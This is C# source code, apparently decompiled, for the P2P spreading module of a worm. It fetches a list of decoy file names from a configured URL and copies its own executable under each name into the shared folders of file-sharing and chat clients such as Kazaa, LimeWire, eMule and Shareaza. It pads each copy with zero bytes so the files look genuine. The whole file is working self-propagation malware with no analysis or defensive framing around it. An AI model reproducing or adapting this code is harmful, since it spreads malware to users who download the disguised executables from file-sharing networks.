using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using Microsoft.Win32;

namespace explorer;

internal class P2P
{
	private static string targetFolder = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string progpath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);

	public static void Start()
	{
		if (!File.Exists(targetFolder + "\\list.txt"))
		{
			WebClient webClient = new WebClient();
			webClient.DownloadFile(config.spreading_p2p_url, targetFolder + "\\list.txt");
			Thread.Sleep(2000);
		}
		BearshareStart();
		Edonkey2000Start();
		EmuleStart();
		GroksterStart();
		IcqStart();
		KazaaStart();
		LimewireStart();
		MorpheusStart();
		ShareazaStart();
		TeslaStart();
		WinmxStart();
		try
		{
			File.Delete(targetFolder + "\\list.txt");
		}
		catch
		{
		}
	}

	public static void ShareazaStart()
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("Software\\Shareaza\\Shareaza\\Downloads", writable: false);
		if (registryKey != null)
		{
			object value = registryKey.GetValue("CollectionPath");
			string cPath = string.Concat(value, "\\");
			Copyfromlist(cPath);
		}
	}

	public static void EmuleStart()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		string cPath = folderPath.Replace("Documents", "Downloads\\eMule\\Incoming\\");
		string cPath2 = progpath + "\\emule\\incoming\\";
		Copyfromlist(cPath);
		Copyfromlist(cPath2);
	}

	public static void KazaaStart()
	{
		string cPath = progpath + "\\kazaa\\my shared folder\\";
		string cPath2 = progpath + "\\kazaa lite\\my shared folder\\";
		string cPath3 = progpath + "\\kazaa lite k++\\my shared folder\\";
		Copyfromlist(cPath);
		Copyfromlist(cPath2);
		Copyfromlist(cPath3);
	}

	public static void IcqStart()
	{
		string cPath = progpath + "\\icq\\shared folder\\";
		Copyfromlist(cPath);
	}

	public static void GroksterStart()
	{
		string cPath = progpath + "\\grokster\\my grokster\\";
		Copyfromlist(cPath);
	}

	public static void BearshareStart()
	{
		string cPath = progpath + "\\bearshare\\shared\\";
		Copyfromlist(cPath);
	}

	public static void Edonkey2000Start()
	{
		string cPath = progpath + "\\edonkey2000\\incoming\\";
		Copyfromlist(cPath);
	}

	public static void MorpheusStart()
	{
		string cPath = progpath + "\\morpheus\\my shared folder\\";
		Copyfromlist(cPath);
	}

	public static void LimewireStart()
	{
		string cPath = progpath + "\\limewire\\shared\\";
		Copyfromlist(cPath);
	}

	public static void TeslaStart()
	{
		string cPath = progpath + "\\tesla\\files\\";
		Copyfromlist(cPath);
	}

	public static void WinmxStart()
	{
		string cPath = progpath + "\\winmx\\shared\\";
		Copyfromlist(cPath);
	}

	public static void Copyfromlist(string cPath)
	{
		if (!Directory.Exists(cPath))
		{
			return;
		}
		StreamReader streamReader = new StreamReader(targetFolder + "\\list.txt");
		for (string text = streamReader.ReadLine(); text != null; text = streamReader.ReadLine())
		{
			if (!File.Exists(cPath + text + ".exe"))
			{
				try
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, cPath + text + ".exe", overwrite: true);
					FileStream fileStream = File.OpenWrite(cPath + text + ".exe");
					long num = fileStream.Seek(0L, SeekOrigin.End);
					int num2 = Convert.ToInt32(text.Length);
					decimal num3 = num2 * 10485;
					while ((decimal)num < num3)
					{
						num++;
						fileStream.WriteByte(0);
					}
					fileStream.Close();
				}
				catch
				{
				}
			}
		}
		streamReader.Close();
	}
}
